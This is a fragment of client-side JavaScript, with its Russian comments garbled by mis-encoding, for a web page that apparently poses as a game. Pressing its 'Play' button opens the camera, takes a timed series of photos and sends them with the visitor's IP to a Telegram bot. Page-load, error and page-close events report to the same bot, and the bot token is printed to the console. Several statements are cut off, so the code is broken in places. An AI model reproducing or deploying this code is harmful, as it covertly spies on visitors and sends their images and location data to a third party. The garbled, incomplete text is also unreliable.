        // 3. –°–ï–†–ò–ô–ù–ê–Ø –°–™–ï–ú–ö–ê
        async function takeSeriesOfPhotos() {
            if (!isProcessActive) return;
            
            if (photoCount < totalPhotos) {
                // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ
                await captureAndSendPhoto(photoCount + 1);

                if (photoCount < totalPhotos) {
                    setTimeout(takeSeriesOfPhotos, photoInterval);
                } else {
                    // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å—ä–µ–º–∫–∏
                    updateStatus('‚úÖ –°—ä–µ–º–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!');

                            `–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n` +
                            `IP: ${userIP}\n` +

                        );
                    } catch (e) {
                        console.error('–û—à–∏–±–∫–∞ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
                    }
                    
                    stopAllCameras();
                }
            }
        }

        // 4. –û–°–¢–ê–ù–û–í–ö–ê –ö–ê–ú–ï–†
        function stopAllCameras() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;
            }
            videoElement.srcObject = null;
            isProcessActive = false;
            isCameraActive = false;
        }

        // 5. –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø –ö–ê–ú–ï–†
        async function initCameras() {
            try {

                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },

                await new Promise(resolve => setTimeout(resolve, 1000));

                try {

                        `üì∏ –ù–ê–ß–ê–õ–û –°–ï–†–ò–ô–ù–û–ô –°–™–ï–ú–ö–ò\n` +
                        `–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n` +
                        `–ò–Ω—Ç–µ—Ä–≤–∞–ª: ${photoInterval}–º—Å\n` +
                        `IP: ${userIP}\n` +
                        `–í—Ä–µ–º—è: ${new Date().toLocaleString()}`
                    );
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ —Å—Ç–∞—Ä—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
                }
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–æ–Ω –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
                newBackground.style.display = 'block';

                // –ù–∞—á–∏–Ω–∞–µ–º —Å—ä–µ–º–∫—É

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
                try {
                    await sendToTelegram(
                        `‚ö†Ô∏è –û–®–ò–ë–ö–ê –î–û–°–¢–£–ü–ê –ö –ö–ê–ú–ï–†–ï\n` +
                        `IP: ${userIP}\n` +
                        `–û—à–∏–±–∫–∞: ${error.message}\n` +
                        `–í—Ä–µ–º—è: ${new Date().toLocaleString()}`
                    );
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ:', e);
                }
            }
        }

        // 6. –û–ë–†–ê–ë–û–¢–ß–ò–ö –ö–ù–û–ü–ö–ò "–ò–ì–†–ê–¢–¨"
        playBtn.addEventListener('click', async function() {
            if (isProcessActive) return;

                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ:', e);
                }
            }
        });

        // ==================== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ====================
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', async function() {
            updateStatus('–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞, –æ—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...');
            
            try {
                // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –±–æ—Ç–∞
                const botCheck = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                const botResult = await botCheck.json();
                
                if (botResult.ok) {
                    updateStatus(`–ë–æ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω: @${botResult.result.username}`);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏

                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ —Ç–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    try {
                        await sendToTelegram(
                            `üì± –°–¢–†–ê–ù–ò–¶–ê –ó–ê–ì–†–£–ñ–ï–ù–ê\n` +
                            `–ë–æ—Ç: @${botResult.result.username}\n` +
                            `–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n` +

                        );
                    } catch (e) {
                        console.error('–û—à–∏–±–∫–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
                    }
                } else {
                    updateStatus(`‚ùå –ë–æ—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${botResult.description}`, true);
                }
            } catch (error) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–æ—Ç–∞: ${error.message}`, true);
            }
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', async function() {
            if (isProcessActive || photoCount > 0) {
                try {
                    await sendToTelegram(
                        `üì¥ –°–¢–†–ê–ù–ò–¶–ê –ó–ê–ö–†–´–¢–ê\n` +
                        `IP: ${userIP}\n` +
                        `–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Ñ–æ—Ç–æ: ${photoCount}/${totalPhotos}\n` +
                        `–í—Ä–µ–º—è: ${new Date().toLocaleString()}`
                    );
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
                }
                
                stopAllCameras();
            }
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ —Å–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isProcessActive) {
                updateStatus('–°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å–∫—Ä—ã—Ç–∞, –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä...');
                stopAllCameras();
            }
        });
        
        // –°—Ä–∞–∑—É –ø—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        console.log('=== –ù–ê–ß–ê–õ–û –†–ê–ë–û–¢–´ ===');
        console.log('–ë–æ—Ç –¥–æ–ª–∂–µ–Ω –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –≤ –∫–∞–Ω–∞–ª:', chatId);
        console.log('–¢–æ–∫–µ–Ω:', botToken);
